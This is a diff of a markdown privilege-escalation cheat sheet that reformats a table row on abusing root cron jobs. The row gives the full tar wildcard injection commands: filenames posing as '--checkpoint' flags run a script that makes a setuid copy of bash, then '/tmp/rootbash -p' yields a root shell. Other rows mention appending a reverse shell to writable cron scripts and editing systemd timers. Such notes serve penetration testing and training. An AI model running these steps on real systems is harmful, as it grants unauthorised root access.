@@ -47,8 +47,8 @@
 | Find running jobs | `pspy64` or `cat /etc/crontab` |
 | Writable called script | Append reverse shell, wait for cron ·|
 | systemd timer | Edit writable .timer, daemon-reload, trigger manually ·|
-| Tar wildcard injection | Cron runs tar ... * in a dir you control → create filenames that look like tar flags <br><br> echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh && chmod +x shell.sh <br> echo "" > "--checkpoint=1" <br> echo "" > "--checkpoint-action=exec=sh shell.sh"
-Wait for cron, then: /tmp/rootbash -p |
+| Tar wildcard injection | Cron runs tar ... * in a dir you control → create filenames that look like tar flags <br> `echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh && chmod +x shell.sh` <br> `echo "" > "--checkpoint=1"` <br> `echo "" > "--checkpoint-action=exec=sh shell.sh"`
+Wait for cron, then: `/tmp/rootbash -p` |
 
 
 #### Special group membership?
